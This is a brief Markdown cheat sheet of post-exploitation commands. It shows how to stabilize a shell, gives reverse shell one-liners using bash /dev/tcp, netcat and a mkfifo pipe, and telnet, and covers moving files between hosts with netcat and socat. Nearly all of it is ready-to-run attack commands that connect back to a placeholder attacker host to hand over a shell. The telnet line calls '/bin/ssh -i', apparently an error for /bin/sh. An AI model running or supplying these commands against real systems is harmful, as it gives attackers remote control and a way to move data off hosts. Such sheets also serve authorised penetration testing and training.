# Shells

## Stabilizing shell

```text
SHELL=/bin/bash script -q /dev/null
[Ctrl + Z]
stty raw -echo
fg
reset
xterm
```

## Reverse shells

### Bash

```text
bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
```

### Netcat

```text
nc -e /bin/sh <LHOST> <LPORT>
nc -c /bin/sh <LHOST> <LPORT>
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/y
```

### Telnet

```text
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/ssh -i 2>&1|telnet <LHOST> <LPORT> >/tmp/y
```


# Transfering files

### Netcat

Netcat is the easiest way to transfer files between Linux systems.

```text
# source
nc -nv <ip> <port> < <file>

# destination
nc -lvnp <port> > <file>
```

### Socat

You can also use socat if you want to use encrypted tunnel.

```text
# source
socat TCP4-LISTEN:<port>,fork file:<src_path>

# destination
socat TCP4:<ip>:<port> file:<dst_path>,create
```

